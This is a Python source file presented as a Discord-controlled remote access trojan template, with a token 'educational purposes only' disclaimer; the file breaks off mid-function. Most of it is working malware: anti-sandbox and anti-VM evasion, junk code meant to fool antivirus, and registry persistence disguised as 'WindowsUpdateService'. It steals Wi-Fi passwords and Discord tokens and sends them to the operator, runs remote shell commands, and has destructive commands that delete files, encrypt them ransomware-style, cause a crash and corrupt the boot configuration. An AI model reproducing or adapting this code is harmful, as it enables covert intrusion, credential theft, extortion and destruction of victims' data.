# mytemplate.py - Advanced RAT Template with FUD Techniques
# ⚠️ DISCLAIMER: For educational purposes only!
# Made by Neek :3

import os
import sys
import time
import random
import base64
import zlib
import ctypes
import threading
import platform
import subprocess
import discord
from discord.ext import commands
import asyncio
import pyautogui
import psutil
import pygetwindow as gw
from datetime import datetime
from typing import Optional
import string
import uuid
import socket
import re
import requests
import winreg
import atexit
import shutil
import json
import webbrowser

if platform.system() != "Windows":
    sys.exit(0)

# ========== DELAY EXECUTION (Anti-Sandbox) ==========
def delay_execution():
    """Random delay to evade sandbox detection"""
    try:
        # Random delay between 10-30 seconds
        delay = random.randint(10, 30)
        time.sleep(delay)
        
        # Check for debugger
        if ctypes.windll.kernel32.IsDebuggerPresent():
            time.sleep(random.randint(60, 120))  # Extra delay if debugged
    except:
        pass

# Run delay immediately
delay_execution()

# ========== OBFUSCATION FUNCTIONS ==========
def obfuscate_string(s):
    """Obfuscate a string using base64 + zlib"""
    return base64.b64encode(zlib.compress(s.encode())).decode()

def deobfuscate_string(s):
    """Deobfuscate a string"""
    return zlib.decompress(base64.b64decode(s.encode())).decode()

# Obfuscated strings
DISCORD_STR = obfuscate_string("discord")
TOKEN_STR = obfuscate_string("token")
REQUESTS_STR = obfuscate_string("requests")

# ========== ANTI-SANDBOX / ANTI-VM ==========
def is_sandbox():
    """Check if running in a sandbox/VM"""
    try:
        # Check for VM processes
        vm_processes = ['vmtoolsd', 'vboxservice', 'vboxtray', 'xenserver', 'vmsrvc']
        for proc in psutil.process_iter(['name']):
            try:
                if proc.info['name'].lower() in vm_processes:
                    return True
            except:
                pass
        
        # Check for VM hardware
        try:
            import wmi
            c = wmi.WMI()
            for disk in c.Win32_DiskDrive():
                if any(x in disk.Model for x in ['VIRTUAL', 'VMware', 'VBOX', 'XEN']):
                    return True
        except:
            pass
        
        # Check for sandbox artifacts
        sandbox_files = [
            'C:\\sandbox',
            'C:\\Users\\Administrator\\Desktop\\sandbox',
            'C:\\analysis',
        ]
        for file in sandbox_files:
            if os.path.exists(file):
                return True
        
        return False
    except:
        return False

# Check if in sandbox and exit if true
if is_sandbox():
    sys.exit(0)

# ========== SINGLE INSTANCE LOCK ==========
dir = os.path.dirname(os.path.abspath(__file__))
lock = os.path.join(dir, ".lock")
if os.path.exists(lock):
    sys.exit(0)
open(lock, "w").close()

running = True

def cleanup():
    global running
    running = False
    if os.path.exists(lock):
        os.remove(lock)

atexit.register(cleanup)

def keep_lock_alive():
    while running:
        if not os.path.exists(lock):
            open(lock, "w").close()
        time.sleep(0.1)
threading.Thread(target=keep_lock_alive, daemon=True).start()

# ========== CONFIGURATION (PLACEHOLDERS - DO NOT CHANGE) ==========
class Config:
    TOKEN = "{placeholder_token}"           # <- Builder replaces this
    WHITELISTED = [{placeholder_whitelist}] # <- Builder replaces this
    MAIN_CHANNEL = {placeholder_main_channel} # <- Builder replaces this
    PREFIX = "{placeholder_prefix}"         # <- Builder replaces this
    STARTUP = {placeholder_add_to_startup}  # <- Builder replaces this

# ========== BOT SETUP ==========
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=Config.PREFIX, intents=intents)
bot.remove_command("help")

# ========== GLOBAL VARIABLES ==========
STREAMING = False
STREAM_TASK = None

# ========== JUNK CODE (Confuses AV) ==========
def junk_function_1():
    a = 1
    for i in range(100):
        a += i * 2
        a -= i / 3
        a = a ** 0.5
        a = a % 1
    return a

def junk_function_2():
    b = []
    for i in range(50):
        b.append(str(i) * random.randint(1, 5))
    return ''.join(b)

# Call junk functions randomly
if random.random() > 0.5:
    junk_function_1()
    junk_function_2()

# ========== STARTUP FUNCTION (FIXED) ==========
def add_to_startup():
    """Add the RAT to Windows startup registry"""
    try:
        # Get the current executable path
        if getattr(sys, 'frozen', False):
            app_path = sys.executable
        else:
            app_path = os.path.abspath(__file__)
        
        if not os.path.exists(app_path):
            return False
        
        # Open the Run registry key
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        
        startup_name = "WindowsUpdateService"
        
        if ' ' in app_path:
            app_path = f'"{app_path}"'
        
        winreg.SetValueEx(key, startup_name, 0, winreg.REG_SZ, app_path)
        winreg.CloseKey(key)
        
        # Add to HKLM if possible
        try:
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, startup_name, 0, winreg.REG_SZ, app_path)
            winreg.CloseKey(key)
        except:
            pass
        
        # Add to Startup folder
        try:
            startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
            if not os.path.exists(os.path.join(startup_folder, 'WindowsUpdate.exe')):
                shutil.copy(app_path.replace('"', ''), os.path.join(startup_folder, 'WindowsUpdate.exe'))
        except:
            pass
        
        return True
    except:
        return False

def is_in_startup():
    """Check if RAT is in startup registry"""
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_READ
        )
        try:
            winreg.QueryValueEx(key, "WindowsUpdateService")
            winreg.CloseKey(key)
            return True
        except:
            winreg.CloseKey(key)
            return False
    except:
        return False

# ========== SYSTEM INFO FUNCTIONS ==========
def get_displayname():
    try:
        if platform.system() == "Windows":
            GetUserNameEx = ctypes.windll.secur32.GetUserNameExW
            NameDisplay = 3
            size = ctypes.pointer(ctypes.c_ulong(0))
            GetUserNameEx(NameDisplay, None, size)
            nameBuffer = ctypes.create_unicode_buffer(size.contents.value)
            GetUserNameEx(NameDisplay, nameBuffer, size)
            return nameBuffer.value
    except:
        pass
    return platform.node()

def get_hwid():
    try:
        if platform.system() == "Windows":
            cmd = 'powershell -Command "Get-CimInstance -ClassName Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID"'
            result = subprocess.check_output(cmd, shell=True).decode().strip()
            if result:
                return result
        return str(uuid.getnode())
    except:
        return str(uuid.getnode())

def get_cpuinfo():
    try:
        if platform.system() == "Windows":
            cmd = 'powershell -Command "Get-CimInstance -ClassName Win32_Processor | Select-Object -ExpandProperty Name"'
            cpu = subprocess.check_output(cmd, shell=True).decode().strip()
            if cpu:
                return cpu
        return platform.processor() or "N/A"
    except:
        try:
            return platform.processor() or "N/A"
        except:
            return "N/A"

def get_gpuinfo():
    try:
        if platform.system() == "Windows":
            cmd = 'powershell -Command "Get-CimInstance -ClassName Win32_VideoController | Select-Object -ExpandProperty Name"'
            gpu = subprocess.check_output(cmd, shell=True).decode().strip()
            if gpu:
                return gpu.split('\n')[0]
            return "N/A"
        else:
            return "N/A"
    except:
        return "N/A"

def get_raminfo():
    ram = psutil.virtual_memory()
    return f"{ram.total / (1024**3):.2f} GB"

def get_disks():
    disks = []
    for partition in psutil.disk_partitions():
        try:
            usage = psutil.disk_usage(partition.mountpoint)
            disks.append({
                'drive': partition.device,
                'free': f"{usage.free / (1024**3):.2f}",
                'total': f"{usage.total / (1024**3):.2f}",
                'percent': usage.percent
            })
        except:
            pass
    return disks

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except:
        return "N/A"

def get_ipinfo():
    try:
        apis = [
            'https://ipapi.co/json/',
            'http://ip-api.com/json/',
            'https://ipinfo.io/json'
        ]
        
        for api_url in apis:
            try:
                response = requests.get(api_url, timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    
                    if 'ipapi.co' in api_url:
                        return {
                            'ip': data.get('ip', 'N/A'),
                            'country': data.get('country_name', 'N/A'),
                            'region': data.get('region', 'N/A'),
                            'city': data.get('city', 'N/A'),
                            'isp': data.get('org', 'N/A')
                        }
                    elif 'ip-api.com' in api_url:
                        return {
                            'ip': data.get('query', 'N/A'),
                            'country': data.get('country', 'N/A'),
                            'region': data.get('regionName', 'N/A'),
                            'city': data.get('city', 'N/A'),
                            'isp': data.get('isp', 'N/A')
                        }
                    elif 'ipinfo.io' in api_url:
                        return {
                            'ip': data.get('ip', 'N/A'),
                            'country': data.get('country', 'N/A'),
                            'region': data.get('region', 'N/A'),
                            'city': data.get('city', 'N/A'),
                            'isp': data.get('org', 'N/A')
                        }
            except:
                continue
                
        return {
            'ip': get_local_ip(),
            'country': 'N/A',
            'region': 'N/A',
            'city': 'N/A',
            'isp': 'N/A'
        }
        
    except:
        return {
            'ip': get_local_ip(),
            'country': 'N/A',
            'region': 'N/A',
            'city': 'N/A',
            'isp': 'N/A'
        }

def get_macaddress():
    try:
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        return mac
    except:
        return "N/A"

def get_wifipasswords():
    profiles = []
    try:
        if platform.system() == "Windows":
            cmd = 'netsh wlan show profiles'
            networks = subprocess.check_output(cmd, shell=True).decode('utf-8', errors='ignore')
            profile_names = re.findall(r'All User Profile\s*:\s*(.*)', networks)
            
            for name in profile_names:
                name = name.strip()
                try:
                    cmd = f'netsh wlan show profile "{name}" key=clear' 
                    profile_info = subprocess.check_output(cmd, shell=True).decode('utf-8', errors='ignore')
                    password_match = re.search(r'Key Content\s*:\s*(.*)', profile_info)
                    password = password_match.group(1).strip() if password_match else "N/A"
                    profiles.append({'name': name, 'password': password})
                except:
                    profiles.append({'name': name, 'password': "N/A"})
        else:
            profiles.append({'name': 'Not supported on this OS', 'password': 'N/A'})
    except:
        profiles.append({'name': 'Error retrieving WiFi', 'password': 'N/A'})
    return profiles

def get_default_browser():
    """Detect the default browser on the system"""
    try:
        if platform.system() == "Windows":
            browsers = [
                ('chrome', r'C:\Program Files\Google\Chrome\Application\chrome.exe'),
                ('chrome', r'C:\Program Files (x86)\Google\Chrome\Application\chrome.exe'),
                ('firefox', r'C:\Program Files\Mozilla Firefox\firefox.exe'),
                ('firefox', r'C:\Program Files (x86)\Mozilla Firefox\firefox.exe'),
                ('edge', r'C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe'),
                ('edge', r'C:\Program Files\Microsoft\Edge\Application\msedge.exe'),
                ('brave', r'C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe'),
                ('brave', r'C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe'),
                ('opera', r'C:\Program Files\Opera\opera.exe'),
                ('opera', r'C:\Program Files (x86)\Opera\opera.exe'),
            ]
            
            for name, path in browsers:
                if os.path.exists(path):
                    return name, path
            
            try:
                key = winreg.OpenKey(winreg.HKEY_CLASSES_ROOT, r'HTTP\shell\open\command')
                command = winreg.QueryValue(key, None)
                winreg.CloseKey(key)
                if command:
                    path = command.split('"')[1] if '"' in command else command.split(' ')[0]
                    if os.path.exists(path):
                        return 'default', path
            except:
                pass
            
        return 'unknown', 'start'
    except:
        return 'unknown', 'start'

# ========== AUTHORIZATION CHECK ==========
def is_authorized():
    async def auth(ctx):
        if ctx.author.id in Config.WHITELISTED:
            return True

        embed = discord.Embed(
            title="Access Denied",
            description="You're not authorized to use this.",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return False
    return commands.check(auth)

# ========== HELPER FUNCTION ==========
async def send_embed(ctx, title, description, color=discord.Color.blue()):
    embed = discord.Embed(title=title, description=description, color=color)
    await ctx.send(embed=embed)

# ========== EVENT HANDLERS ==========
@bot.event
async def on_ready():
    # Add to startup
    if Config.STARTUP:
        add_to_startup()
    
    channel = bot.get_channel(Config.MAIN_CHANNEL)
    if channel:
        await channel.send(f"<@{Config.WHITELISTED[0]}>")
        
        user = get_displayname()
        startup_status = "✅" if is_in_startup() else "❌"
        
        embed = discord.Embed(
            title="✅ Bot Online",
            description=(
                f"Prefix: `{Config.PREFIX}`\n"
                f"User: **`{user}`**\n"
                f"Startup: {startup_status}\n"
                f"Type `{Config.PREFIX}help`"
            ),
            color=discord.Color.green()
        )
        await channel.send(embed=embed)

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await send_embed(ctx, "Command Not Found", f"Use `{Config.PREFIX}help`", discord.Color.red())
    elif isinstance(error, commands.CheckFailure):
        pass
    else:
        await send_embed(ctx, "Error", f"```{str(error)}```", discord.Color.red())

# ========== HELP COMMAND ==========

@bot.command(name='help')
async def cmd_help(ctx):
    """Show all commands"""
    if ctx.author.id not in Config.WHITELISTED:
        return
    
    embed = discord.Embed(
        title="📋 Commands",
        description="A list of commands you can run to control the target PC.",
        color=discord.Color.purple()
    )
    
    categories = {
        "Config": [
            f"**Prefix:** `{Config.PREFIX}`",
            f"**Whitelisted:** <@{Config.WHITELISTED}>",
            f"**Main Channel:** <#{Config.MAIN_CHANNEL}>"
        ],
        "System Info": [
            "`info` - Get advanced system information",
            "`ip` - Get public IP address",
            "`sysinfo` - Quick system summary",
        ],
        "Destructive": [
            "`lock` - Locks PC",
            "`crash` - Blue screens PC",
            "`filescramble` - Renames all files randomly",
            "`filedestroy` - Deletes all personal files",
            "`fileransom` - Encrypts all files",
            "`virus` - Fake virus messages",
            "`killprocess [name]` - Kill a process",
            "`disabletaskmgr` - Disable Task Manager",
            "`enabletaskmgr` - Enable Task Manager",
            "`destroyboot` - Corrupt boot files (⚠️ DANGEROUS)",
        ],
        "Messages": [
            "`voice [message]` - Text-to-speech message",
            "`msgbox [message]` - Message box popup",
            "`rickroll` - Opens Rickroll in their browser",
            "`alarm [seconds]` - Sound an alarm",
            "`notify [message]` - Send Windows notification",
        ],
        "Control": [
            "`screenshot [name]` - Take screenshot",
            "`screenshare` - Start screen sharing",
            "`stopscreenshare` - Stop screen sharing",
            "`open <app>` - Open application",
            "`close <app>` - Close application",
            "`listapps [limit]` - List running apps",
            "`cmd [command]` - Run a cmd command",
            "`powershell [command]` - Run PowerShell command",
            "`webcam` - Take webcam photo",
            "`micrecord [seconds]` - Record microphone",
            "`tokens` - Grab Discord tokens from PC",
        ],
        "Mouse & Keyboard": [
            "`click [left|right|middle]` - Mouse click",
            "`press <keys>` - Press keys (ex: ctrl+c)",
            "`type [text]` - Type text",
            "`move [x] [y]` - Move mouse",
            "`scroll [amount]` - Scroll",
            "`doubleclick` - Double click",
            "`rightclick` - Right click",
            "`getpos` - Get mouse position",
        ],
        "Power Control": [
            "`shutdown [delay]` - Shutdown PC",
            "`restart [delay]` - Restart PC",
            "`sleep` - Put PC to sleep",
            "`logoff` - Log off user",
        ],
        "Media": [
            "`playpause` - Play/Pause media",
            "`nexttrack` - Next track",
            "`prevtrack` - Previous track",
            "`volumeup` - Volume up",
            "`volumedown` - Volume down",
            "`mute` - Mute volume",
        ],
        "Files": [
            "`listfiles [directory]` - List files",
            "`download [filepath]` - Download file",
            "`deletefile [filepath]` - Delete a file",
            "`createfile [name] [content]` - Create a file",
        ],
        "Bot": [
            "`startup` - Check startup status",
            "`addstartup` - Add to startup",
            "`clearchat [amount]` - Delete bot messages",
            "`exit` - Closes the rat and exits."
        ],
        "Credits": [
            "-# Thanks to **Neek**, this product is brought to you for free! 🎀"
        ]
    }
    
    for category, commands in categories.items():
        embed.add_field(name=category, value="\n".join(commands), inline=False)
    
    await ctx.send(embed=embed)

# ========== STARTUP MANAGEMENT COMMANDS ==========

@bot.command(name='startup')
@is_authorized()
async def cmd_startup(ctx):
    """Check if RAT is in startup"""
    try:
        if is_in_startup():
            await send_embed(ctx, "✅ Startup Status", "RAT is in startup registry and will run on boot.", discord.Color.green())
        else:
            await send_embed(ctx, "❌ Startup Status", "RAT is NOT in startup registry. Use `addstartup` to add it.", discord.Color.red())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='addstartup')
@is_authorized()
async def cmd_addstartup(ctx):
    """Add RAT to startup (persistence)"""
    try:
        if add_to_startup():
            await send_embed(ctx, "✅ Startup Added", "RAT has been added to startup registry. It will run when the PC boots.", discord.Color.green())
        else:
            await send_embed(ctx, "❌ Startup Failed", "Failed to add to startup. Try running as admin.", discord.Color.red())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

# ========== SYSTEM INFO COMMANDS ==========

@bot.command(name='info')
@is_authorized()
async def cmd_info(ctx):
    """Get advanced system information"""
    try:
        embed = discord.Embed(
            title="Collecting system information",
            description="This may take a while depending on the victim's device.",
            color=discord.Color.blue()
        )
        await ctx.send(embed=embed)

        display_name = get_displayname()
        hwid = get_hwid()
        cpu_info = get_cpuinfo()
        gpu_info = get_gpuinfo()
        ram_info = get_raminfo()
        disks = get_disks()
        ip_info = get_ipinfo()
        mac_address = get_macaddress()
        wifi_profiles = get_wifipasswords()

        embed = discord.Embed(
            title="🖥️ System Information",
            color=discord.Color.blue()
        )

        embed.add_field(name="Display Name", value=f"```{display_name}```", inline=False)
        embed.add_field(name="Hardware ID", value=f"```{hwid}```", inline=False)
        
        embed.add_field(name="CPU", value=f"```{cpu_info}```", inline=False)
        embed.add_field(name="GPU", value=f"```{gpu_info}```", inline=False)
        
        memory = psutil.virtual_memory()
        cpu_percent = psutil.cpu_percent(interval=1)
        
        embed.add_field(name="RAM", value=f"```{ram_info} ({memory.percent}% used)```", inline=False)
        embed.add_field(name="CPU Usage", value=f"```{cpu_percent}%```", inline=True)
        
        disk_str = ""
        for disk in disks[:3]:
            disk_str += f"{disk['drive']}: {disk['free']}GB free / {disk['total']}GB total ({disk['percent']}% used)\n"
        embed.add_field(name="Disks", value=f"```{disk_str}```", inline=False)
        
        embed.add_field(name="Public IP", value=f"```{ip_info['ip']}```", inline=False)
        embed.add_field(name="Location", value=f"```{ip_info['city']}, {ip_info['region']}, {ip_info['country']}```", inline=False)
        embed.add_field(name="ISP", value=f"```{ip_info['isp']}```", inline=False)
        
        embed.add_field(name="MAC Address", value=f"```{mac_address}```", inline=False)
        
        embed.add_field(name="Local IP", value=f"```{get_local_ip()}```", inline=True)
        embed.add_field(name="OS", value=f"```{platform.system()} {platform.release()}```", inline=True)
        
        boot_time = datetime.fromtimestamp(psutil.boot_time())
        embed.add_field(name="Boot Time", value=f"```{boot_time.strftime('%Y-%m-%d %H:%M:%S')}```", inline=True)
        embed.add_field(name="Processes", value=f"```{len(psutil.pids())}```", inline=True)
        
        if wifi_profiles:
            wifi_str = ""
            for wifi in wifi_profiles[:5]:
                wifi_str += f"{wifi['name']}: {wifi['password']}\n"
            embed.add_field(name="WiFi Profiles", value=f"```{wifi_str}```", inline=False)
            if len(wifi_profiles) > 5:
                embed.add_field(name="More WiFi", value=f"```...and {len(wifi_profiles)-5} more profiles```", inline=False)

        await ctx.send(embed=embed)
    except Exception as e:
        await send_embed(ctx, "Info Error", f"Failed to get system info: {str(e)}", discord.Color.red())

@bot.command(name='sysinfo')
@is_authorized()
async def cmd_sysinfo(ctx):
    """Quick system summary"""
    try:
        info = get_ipinfo()
        embed = discord.Embed(
            title="⚡ Quick System Info",
            color=discord.Color.blue()
        )
        embed.add_field(name="User", value=get_displayname(), inline=True)
        embed.add_field(name="OS", value=f"{platform.system()} {platform.release()}", inline=True)
        embed.add_field(name="CPU", value=f"{psutil.cpu_percent()}%", inline=True)
        embed.add_field(name="RAM", value=f"{psutil.virtual_memory().percent}%", inline=True)
        embed.add_field(name="IP", value=info['ip'], inline=True)
        embed.add_field(name="Host", value=platform.node(), inline=True)
        await ctx.send(embed=embed)
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

# ========== TOKEN TAKER COMMAND ==========

@bot.command(name='tokens')
@is_authorized()
async def cmd_tokens(ctx):
    """Grab Discord tokens from the victim's PC"""
    try:
        await send_embed(ctx, "🔑 Token Grabber", "Searching for Discord tokens...", discord.Color.gold())
        
        found_tokens = []
        token_patterns = [
            r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',
            r'mfa\.[\w-]{84}',
        ]
        
        paths = [
            os.path.expandvars(r'%APPDATA%\Discord\Local Storage\leveldb'),
            os.path.expandvars(r'%APPDATA%\DiscordCanary\Local Storage\leveldb'),
            os.path.expandvars(r'%APPDATA%\DiscordPTB\Local Storage\leveldb'),
            os.path.expandvars(r'%APPDATA%\Lightcord\Local Storage\leveldb'),
            os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Storage\leveldb'),
            os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb'),
            os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Local Storage\leveldb'),
            os.path.expandvars(r'%APPDATA%\Opera Software\Opera Stable\Local Storage\leveldb'),
            os.path.expandvars(r'%APPDATA%\Vivaldi\Local Storage\leveldb'),
        ]
        
        for path in paths:
            if os.path.exists(path):
                try:
                    for file in os.listdir(path):
                        if file.endswith('.log') or file.endswith('.ldb'):
                            file_path = os.path.join(path, file)
                            try:
                                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                    for pattern in token_patterns:
                                        matches = re.findall(pattern, content)
                                        for match in matches:
                                            if match not in found_tokens:
                                                found_tokens.append(match)
                            except:
                                pass
                except:
                    pass
        
        if found_tokens:
            embed = discord.Embed(
                title="🔑 Tokens Found!",
                color=discord.Color.gold()
            )
            
            token_list = ""
            for i, token in enumerate(found_tokens[:10]):
                masked = token[:8] + "..." + token[-4:]
                token_list += f"`{masked}`\n"
            
            embed.add_field(name=f"Found {len(found_tokens)} token(s)", value=token_list, inline=False)
            
            if len(found_tokens) > 0:
                with open('tokens_found.txt', 'w') as f:
                    for token in found_tokens:
                        f.write(token + '\n')
                
                await ctx.send(file=discord.File('tokens_found.txt'))
                os.remove('tokens_found.txt')
                
                embed.set_footer(text="Tokens saved and sent as file")
            
            await ctx.send(embed=embed)
        else:
            await send_embed(ctx, "🔑 Token Grabber", "No Discord tokens found on this system.", discord.Color.orange())
            
    except Exception as e:
        await send_embed(ctx, "Token Error", f"Failed to grab tokens: {str(e)}", discord.Color.red())

# ========== DESTRUCTIVE COMMANDS ==========

@bot.command(name='lock')
@is_authorized()
async def cmd_lock(ctx):
    try:
        ctypes.windll.user32.LockWorkStation()
        await send_embed(ctx, "🔒 PC Locked", "Workstation has been locked.", discord.Color.orange())
    except Exception as e:
        await send_embed(ctx, "Error", f"Failed to lock PC: {str(e)}", discord.Color.red())

@bot.command(name='crash')
@is_authorized()
async def cmd_crash(ctx):
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xC000021A, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
        await send_embed(ctx, "💀 BSOD Initiated", "Blue screen of death triggered!", discord.Color.dark_red())
    except:
        await send_embed(ctx, "BSOD Failed", "Could not trigger blue screen.", discord.Color.red())

@bot.command(name='killprocess')
@is_authorized()
async def cmd_killprocess(ctx, *, process_name: str):
    try:
        killed = 0
        for proc in psutil.process_iter(['pid', 'name']):
            if process_name.lower() in proc.info['name'].lower():
                proc.kill()
                killed += 1
        if killed > 0:
            await send_embed(ctx, "Process Killed", f"Killed **{killed}** process(es) matching **{process_name}**", discord.Color.red())
        else:
            await send_embed(ctx, "Process Not Found", f"No process found matching **{process_name}**", discord.Color.orange())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='disabletaskmgr')
@is_authorized()
async def cmd_disabletaskmgr(ctx):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        await send_embed(ctx, "Task Manager Disabled", "Task Manager has been disabled!", discord.Color.red())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='enabletaskmgr')
@is_authorized()
async def cmd_enabletaskmgr(ctx):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
        await send_embed(ctx, "Task Manager Enabled", "Task Manager has been enabled!", discord.Color.green())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='destroyboot')
@is_authorized()
async def cmd_destroyboot(ctx):
    await send_embed(ctx, "⚠️ WARNING", "This will corrupt boot files! Type 'YES' to confirm", discord.Color.dark_red())
    
    def check(m):
        return m.author == ctx.author and m.content == "YES"
    
    try:
        await bot.wait_for('message', timeout=30, check=check)
        if os.name == "nt":
            os.system('bcdedit /export C:\\boot_backup.bak')
            os.system('bcdedit /deletevalue {default} path')
            await send_embed(ctx, "💀 Boot Files Corrupted", "System will not boot on restart!", discord.Color.dark_red())
        else:
            await send_embed(ctx, "Error", "Only works on Windows!", discord.Color.red())
    except asyncio.TimeoutError:
        await send_embed(ctx, "Cancelled", "Command timed out", discord.Color.orange())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='filescramble')
@is_authorized()
async def cmd_filescramble(ctx):
    try:
        folders = ['Downloads', 'Documents', 'Pictures', 'Music', 'Videos', 'Desktop']
        scrambled = 0
        
        await send_embed(ctx, "File Scramble Started", "Renaming files in personal folders...", discord.Color.purple())
        
        for folder in folders:
            folder_path = os.path.join(os.path.expanduser('~'), folder)
            if os.path.exists(folder_path):
                for root, dirs, files in os.walk(folder_path):
                    for file in files:
                        try:
                            old_path = os.path.join(root, file)
                            ext = os.path.splitext(file)[1]
                            new_name = ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + ext
                            new_path = os.path.join(root, new_name)
                            os.rename(old_path, new_path)
                            scrambled += 1
                        except:
                            pass
        
        await send_embed(ctx, "File Scramble Complete", f"Successfully scrambled **{scrambled}** files!", discord.Color.purple())
    except Exception as e:
        await send_embed(ctx, "Scramble Error", f"Failed to scramble files: {str(e)}", discord.Color.red())

@bot.command(name='filedestroy')
@is_authorized()
async def cmd_filedestroy(ctx):
    try:
        folders = ['Downloads', 'Documents', 'Pictures', 'Music', 'Videos', 'Desktop']
        deleted = 0
        
        await send_embed(ctx, "File Destruction Started", "Deleting files in personal folders...", discord.Color.dark_red())
        
        for folder in folders:
            folder_path = os.path.join(os.path.expanduser('~'), folder)
            if os.path.exists(folder_path):
                for root, dirs, files in os.walk(folder_path):
                    for file in files:
                        try:
                            file_path = os.path.join(root, file)
                            os.remove(file_path)
                            deleted += 1
                        except:
                            pass
        
        await send_embed(ctx, "File Destruction Complete", f"Successfully deleted **{deleted}** files!", discord.Color.dark_red())
    except Exception as e:
        await send_embed(ctx, "Destruction Error", f"Failed to delete files: {str(e)}", discord.Color.red())

@bot.command(name='fileransom')
@is_authorized()
async def cmd_fileransom(ctx):
    try:
        folders = ['Downloads', 'Documents', 'Pictures', 'Music', 'Videos', 'Desktop']
        encrypted = 0
        
        await send_embed(ctx, "Ransomware Started", "Encrypting files in personal folders...", discord.Color.dark_purple())
        
        for folder in folders:
            folder_path = os.path.join(os.path.expanduser('~'), folder)
            if os.path.exists(folder_path):
                for root, dirs, files in os.walk(folder_path):
                    for file in files:
                        try:
                            file_path = os.path.join(root, file)
                            with open(file_path, 'rb') as f:
                                data = f.read()
                            encrypted_data = base64.b64encode(data)
                            with open(file_path + '.ENCRYPTED', 'wb') as f:
                                f.write(encrypted_data)
                            os.remove(file_path)
                            encrypted += 1
                        except:
                            pass
        
        await send_embed(ctx, "Ransomware Complete", f"Successfully encrypted **{encrypted}** files!", discord.Color.dark_purple())
    except Exception as e:
        await send_embed(ctx, "Ransomware Error", f"Failed to encrypt files: {str(e)}", discord.Color.red())

@bot.command(name='virus')
@is_authorized()
async def cmd_virus(ctx):
    try:
        await send_embed(ctx, "Virus Alert", "Displaying fake virus messages on screen", discord.Color.red())
        
        messages = [
            "WARNING! This device is filled with viruses!",
            "Pay $234,324,214 in crypto within 24 hours!",
            "All your files will be deleted if you don't pay!",
            "You have been hacked! Your data is encrypted!",
            "Sending all your files to the dark web..."
        ]
        
        for msg in messages:
            subprocess.run(f"""PowerShell -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('{msg}')" """, shell=True, capture_output=True, text=True)
            time.sleep(1)
    except Exception as e:
        await send_embed(ctx, "Virus Error", f"Failed to display virus messages: {str(e)}", discord.Color.red())

# ========== MESSAGE COMMANDS ==========

@bot.command(name='voice')
@is_authorized()
async def cmd_voice(ctx, *, message: str):
    try:
        engine = pyttsx3.init()
        engine.say(message)
        engine.runAndWait()
        await send_embed(ctx, "Voice Message", f"Text-to-speech said: **{message}**", discord.Color.blue())
    except Exception as e:
        await send_embed(ctx, "Voice Error", f"Failed to speak message: {str(e)}", discord.Color.red())

@bot.command(name='msgbox')
@is_authorized()
async def cmd_msgbox(ctx, *, message: str):
    try:
        subprocess.run(f"""PowerShell -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('{message}')" """, shell=True, capture_output=True, text=True)
        await send_embed(ctx, "Message Box", f"Displayed message box: **{message}**", discord.Color.blue())
    except Exception as e:
        await send_embed(ctx, "Message Error", f"Failed to display message box: {str(e)}", discord.Color.red())

@bot.command(name='notify')
@is_authorized()
async def cmd_notify(ctx, *, message: str):
    try:
